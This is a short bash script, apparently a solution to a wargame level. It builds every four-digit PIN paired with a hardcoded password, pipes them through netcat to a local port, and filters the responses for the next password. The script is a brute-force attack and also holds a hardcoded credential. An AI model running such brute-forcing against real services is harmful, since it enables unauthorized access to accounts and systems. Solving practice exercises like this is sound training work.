#!/bin/bash

# generate the combinations file
passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for x in {0..9}{0..9}{0..9}{0..9}; do
  echo "$passwd $x" >> combo.txt
done

# setup netcat and send combo.txt to the port and get response
cat combo.txt | nc localhost 30002 >> results.txt

# parse through results.txt and extract string with password
# print all unique entires to the terminal.
cat results.txt | uniq -u
